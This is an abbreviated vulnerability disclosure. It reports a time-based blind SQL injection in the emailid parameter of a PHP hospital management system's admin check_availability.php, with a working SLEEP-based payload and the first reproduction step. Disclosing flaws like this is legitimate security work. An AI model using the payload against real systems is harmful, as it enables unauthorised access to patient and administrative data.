# Exploit Title: Hospital Management System – SQL Injection in check_availability.php (`http://localhost/hospitalmanagementsystemproject4/hospital/hms/admin/check_availability.php`)
...
- **URL:** `http://localhost/hospitalmanagementsystemproject4/hospital/hms/admin/check_availability.php`
- **HTTP Method:** POST
...
- **Type:** time-based blind
  ...
  - **Payload:** `emailid=1' AND (SELECT 8658 FROM (SELECT(SLEEP(5)))ovji)-- TMpu`
...
1. Browse to `http://localhost/hospitalmanagementsystemproject4/hospital/hms/admin/check_availability.php`.  
